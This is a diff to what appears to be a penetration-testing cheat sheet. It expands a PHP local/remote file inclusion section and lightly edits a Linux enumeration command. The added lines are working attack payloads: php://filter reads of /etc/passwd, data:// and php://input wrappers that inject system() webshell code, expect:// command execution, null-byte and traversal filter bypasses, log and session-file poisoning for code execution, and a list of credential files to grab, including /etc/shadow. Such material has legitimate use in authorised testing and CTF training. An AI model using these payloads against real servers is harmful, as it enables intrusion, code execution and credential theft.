@@ -1422,18 +1422,42 @@ Here are some useful commands:
 
 ### 4.5.1. LFI/RFI
 
-Some handy wrappers:
+Some handy PHP wrappers:
 [PHP Documentation: Wrappers](https://www.php.net/manual/en/wrappers.php)
 
+Using php-wrapper with 'filter' to grab local files:
+- docs: [https://www.php.net/manual/en/wrappers.php.php](https://www.php.net/manual/en/wrappers.php.php)
+
 ```sh
+# filter without any processing to grab plaintext:
+php://filter/resource=/path/to/flle
+
 # base64 encode file before grabbing (helps grab php source or binary files)
 # available starting with PHP 5.0.0
 php://filter/convert.base64-encode/resource=/path/to/file
-# filter without base64-encode:
-php://filter/resource=
-# chaining multiple filters with "|":
-php://filter/convert.base64-encode|convert.base64-decode/resource=index.php
 
+# ROT13 encode file:
+php://filter/read=string.rot13/resource=/etc/passwd
+
+# chaining multiple filters with "|":
+php://filter/string.toupper|string.rot13/resource=/path/to/file
+
+# list of useful filters:
+# https://www.php.net/manual/en/filters.php
+string.toupper
+string.tolower
+string.rot13
+convert.base64-encode
+convert.base64-decode
+zlib.deflate  # i.e. gzip, without headers/trailers
+zlib.inflate  # i.e. gunzip
+bzip2.compress
+bzip2.decompress
+```
+
+Some other handy wrappers:
+
+```sh
 # if enabled (not default), run commands:
 expect://whoami
 
@@ -1443,17 +1467,57 @@ expect://whoami
 php://input
 # example POST body: <?php system('whoami'); ?>
 
+# Inject your own string into the file:
+data://text/plain;base64,SSBsb3ZlIFBIUAo=  # injects "I love PHP"
+# can be used to inject arbitrary php code!
+
+# When injecting php code, a good way to test code execution is with:
+<?php phpinfo();?>
+
 # use "data:" to inject executable php code directly into the URL
 data:text/plain,<?php phpinfo(); ?>
 data:,<?system($_GET['x']);?>&x=ls
 data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls
 
-# sometimes you can trick PHP not to concatenate a .php file extension onto
+# FILTER BYPASSES:
+# Sometimes you can bypass filters or trick PHP not to concatenate a .php file extension onto
 # a file path by injecting a NULL byte. E.g.:
 ?page=../../../etc/passwd%00
-# you can take this technique further and URL-encode the entire php://filter
-# directive to hopefully bypass server-side filters on it. Or even double-encode
+# You can take this technique further and URL-encode the entire php://filter
+# directive to hopefully bypass server-side filters on it. Or even double-URL-
+# encode the string.
+# Also try bypassing filters with ....// instead of ../
 ```
+
+You can get code execution by poisoning local files, including log files and
+PHP session files with PHP code.
+
+Common PHP sessions file locations:
+- c:\Windows\Temp
+- /tmp/
+- /var/lib/php5
+- /var/lib/php/session
+
+Default session filename: `sess_<SESSION_ID>`
+(grab SESSION_ID from your cookies in the browser)
+
+The following are some Linux system files that have sensitive information that
+are good to try to grab when you have an LFI vulnerability.
+
+```
+/etc/issue
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/mysql/my.cnf
+/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the file descriptor)
+/proc/self/environ
+/proc/version
+/proc/cmdline
+```
+
 
 ### PHP one-liner Webshells
 
@@ -2414,7 +2478,7 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 getenforce
 
 # running processes
-ps aux
+ps -ef wwf
 
 # shell history
 cat /home/*/.*history
